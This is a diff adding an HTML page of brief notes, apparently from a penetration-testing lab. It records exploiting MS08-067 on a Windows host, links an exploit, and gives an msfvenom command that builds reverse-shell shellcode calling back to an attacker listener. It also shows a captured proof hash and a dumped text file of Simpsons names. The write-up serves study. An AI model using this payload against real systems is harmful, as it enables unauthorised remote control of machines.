@@ -1,0 +1,198 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>shell</title>
+</head><body>Summary:<br/>
+already knew it was vulnerable to MS08-067 from smb nse script<br/>
+tried for hours to modify exploit and finally got it<br/>
+https://github.com/ohnozzy/Exploit/blob/master/MS08_067.py<br/>
+Modified shellcode with:<br/>
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.187 LPORT=443 &nbsp;EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -n 32 -f python<br/>
+Had to use -n 32 to get it to match the size of the payload in the example<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+<br/>
+<br/>
+<img src="image 2.png" /><br/>
+<br/>
+<br/>
+type proof.txt<br/>
+257ea6949c88af6e0b160805b34fdab5 <br/>
+<br/>
+<img src="image 3.png" /><br/>
+<br/>
+C:\share\New Folder (4)&gt;type tv.txt<br/>
+type tv.txt<br/>
+Cletus Spuckler<br/>
+Homer Simpson<br/>
+Dave Shutton<br/>
+Ned Flanders<br/>
+Bleeding Gums Murphy<br/>
+Jodie Foster<br/>
+Elizabeth Taylor<br/>
+Frankie the Squealer<br/>
+Legs and Louie<br/>
+Patches and Poor Violet<br/>
+Poochie<br/>
+Sherri and Terri<br/>
+Russi Taylor<br/>
+Comic Book Guy<br/>
+Sideshow Mel<br/>
+Charlie<br/>
+Dolph<br/>
+Krusty the Clown<br/>
+Gábor Csupó<br/>
+Kearney Zzyzwicz<br/>
+Superintendent Gary Chalmers<br/>
+Herman Hermann<br/>
+The Rich Texan<br/>
+Old Jewish Man<br/>
+Brandine Spuckler<br/>
+Mona Simpson<br/>
+Rabbi Hyman Krustofski<br/>
+Bumblebee Man<br/>
+Groundskeeper Willie<br/>
+Üter<br/>
+Sanjay Nahasapeemapetilon<br/>
+Ruth Powers<br/>
+Aristotle Amadopolis<br/>
+Lunchlady Doris<br/>
+Declan Desmond<br/>
+Barney Gumble<br/>
+Chief Clancy Wiggum<br/>
+Judge Constance Harm<br/>
+Current look: "The Homer They Fall"<br/>
+Fat Tony<br/>
+Nancy Cartwright<br/>
+Mr. Teeny<br/>
+James Earl Jones<br/>
+Captain Lance Murdock<br/>
+Radioactive Man<br/>
+Disco Stu<br/>
+Princess Kashmir<br/>
+Selma Bouvier<br/>
+Ms. Albright<br/>
+Duffman<br/>
+Eddie and Lou<br/>
+Elizabeth Hoover<br/>
+Kent Brockman<br/>
+Sideshow Bob<br/>
+Cecil Terwilliger<br/>
+Bart Simpson<br/>
+Allison Taylor<br/>
+Chase<br/>
+Roger Meyers, Jr.<br/>
+Lenny Leonard<br/>
+Jasper Beardly<br/>
+Rod Flanders<br/>
+Snowball<br/>
+Lionel Hutz<br/>
+Lewis<br/>
+Blue Haired Lawyer<br/>
+Richard<br/>
+Dr. J. Loren Pryor<br/>
+Hans Moleman<br/>
+Lisa Simpson<br/>
+Martin Prince<br/>
+Yeardley Smith<br/>
+Judge Roy Snyder<br/>
+Ling Bouvier<br/>
+Leopold<br/>
+Mary Bailey<br/>
+Jimbo Jones<br/>
+Cookie Kwan<br/>
+Boobarella<br/>
+Moe Szyslak<br/>
+Mr. Costington<br/>
+Waylon Smithers<br/>
+Ginger Flanders<br/>
+Marge Simpson<br/>
+Gino<br/>
+Snake Jailbird<br/>
+Manjula Nahasapeemapetilon<br/>
+The Happy Little Elves<br/>
+Reverend Timothy Lovejoy<br/>
+Patty Bouvier<br/>
+Milhouse Van Houten<br/>
+Arnie Pye<br/>
+Sarah Wiggum<br/>
+Dr. Julius Hibbert<br/>
+Lois Pennycandy<br/>
+Baby Gerald<br/>
+Helen Lovejoy<br/>
+Dr. Nick Riviera<br/>
+Drederick Tatum<br/>
+Bill and Marty<br/>
+Herbert Powell<br/>
+Grampa Abraham Simpson<br/>
+Gil Gunderson<br/>
+Rachel Jordan<br/>
+Ralph Wiggum<br/>
+Crazy Cat Lady<br/>
+Birchibald "Birch" T. Barlow<br/>
+Blinky<br/>
+Kirk Van Houten<br/>
+Coach Lugash<br/>
+Francesca<br/>
+Dr. Marvin Monroe<br/>
+Capital City Goofball<br/>
+Lindsey Naegle<br/>
+Atkins, State Comptroller<br/>
+Artie Ziff<br/>
+Mayor "Diamond Joe" Quimby<br/>
+Wiseguy<br/>
+Old Barber<br/>
+Benjamin, Doug, and Gary<br/>
+Bernice Hibbert<br/>
+Agnes Skinner<br/>
+Rainier Wolfcastle<br/>
+Principal Seymour Skinner<br/>
+Jacqueline Bouvier<br/>
+Nelson Muntz<br/>
+Jacques<br/>
+Maggie Simpson<br/>
+Lurleen Lumpkin<br/>
+Gloria<br/>
+Carl Carlson<br/>
+Maude Flanders<br/>
+Luann Van Houten<br/>
+Santa's Little Helper<br/>
+Johnny Tightlips<br/>
+Dr. Velimirovic<br/>
+Akira<br/>
+Edna Krabappel<br/>
+Janey Powell<br/>
+Yes Guy<br/>
+Otto Mann<br/>
+Amber Simpson<br/>
+Itchy &amp; Scratchy<br/>
+Charles Montgomery "Monty" Burns<br/>
+Wendell Borton<br/>
+Luigi<br/>
+Professor John Frink<br/>
+Troy McClure<br/>
+Jebediah Springfield<br/>
+Harry Shearer<br/>
+Todd Flanders<br/>
+Ernst and Gunter<br/>
+Dewey Largo<br/>
+Nancy Cartwright<br/>
+Mrs. Glick<br/>
+Apu Nahasapeemapetilon<br/>
+Scott Christian<br/>
+Squeaky-Voiced Teen<br/>
+Veterinarian<br/>
+Captain Horatio McCallister<br/>
+Kang and Kodos<br/>
+<br/>
+<br/>
+<br/>
+<img src="image 4.png" /><br/>
+<br/>
+<img src="image 5.png" /><br/>
+<br/>
+Nothing in the wwwroot, mailroot, or ftproot. Dir command takes forever and freezes when trying to see what is in AdminScripts.<br/>
+<br/>
+</body></html>
